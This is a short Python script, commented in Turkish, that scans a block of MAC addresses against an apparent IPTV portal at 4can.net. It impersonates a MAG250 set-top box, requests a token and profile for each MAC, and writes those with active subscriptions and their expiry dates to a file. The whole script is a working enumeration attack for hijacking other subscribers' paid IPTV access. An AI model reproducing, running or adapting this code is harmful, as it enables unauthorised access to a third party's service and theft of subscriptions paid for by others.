import requests
import json

# Hedef sunucu bilgileri
SUNUCU_URL = "http://4can.net:80/portal.php"
C_URL = "http://4can.net:80/c/"

def dogrula(mac):
    headers = {
        'User-Agent': 'MAG250',
        'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;',
    }
    
    try:
        # 1. Adım: Handshake
        res = requests.get(f"{SUNUCU_URL}?type=stb&action=handshake&token=", headers=headers, timeout=10)
        token = res.json().get('js', {}).get('token')
        
        if token:
            # 2. Adım: Profil Bilgisi (Gerçeklik Testi)
            # 4can gibi sunucular 'get_profile' ile gerçek veri döner.
            profil_res = requests.get(f"{SUNUCU_URL}?type=stb&action=get_profile&token={token}", headers=headers, timeout=10)
            data = profil_res.json().get('js', {})
            
            # Sadece geçerli bir bitiş tarihi varsa kaydet
            if data and data.get('expired'):
                skt = data.get('expired')
                print(f"✅ BAŞARILI: {mac} | SKT: {skt}")
                return f"{C_URL} | {mac} | SKT: {skt}"
    except Exception as e:
        # Bağlantı hatası olursa terminalde görelim
        print(f"❌ Hata ({mac}): {e}")
        pass
    return None

def calistir():
    # Tarama yapılacak blok (Örn: 00:1A:79:4C:A5)
    prefix = "00:1A:79:4C:A5"
    print(f"🚀 Tarama başladı: {SUNUCU_URL}")
    
    gecerli_maclar = []
    
    # 100 adet dene
    for i in range(100):
        suffix = hex(i)[2:].zfill(2).upper()
        mac = f"{prefix}:{suffix}"
        sonuc = dogrula(mac)
        if sonuc:
            gecerli_maclar.append(sonuc)
            
    # DOSYAYI YAZ
    # 'w' modu dosyayı tamamen sıfırlar, sadece yeni sonuçları yazar.
    with open("calisan_maclar.txt", "w", encoding="utf-8") as f:
        if gecerli_maclar:
            f.write("\n".join(gecerli_maclar))
        else:
            # Eğer hiç bulamazsa dosyaya bunu yazar ki eski liste silinsin
            f.write("TARAMA YAPILDI: 4can.net üzerinde aktif MAC bulunamadı.")

if __name__ == "__main__":
    calistir()
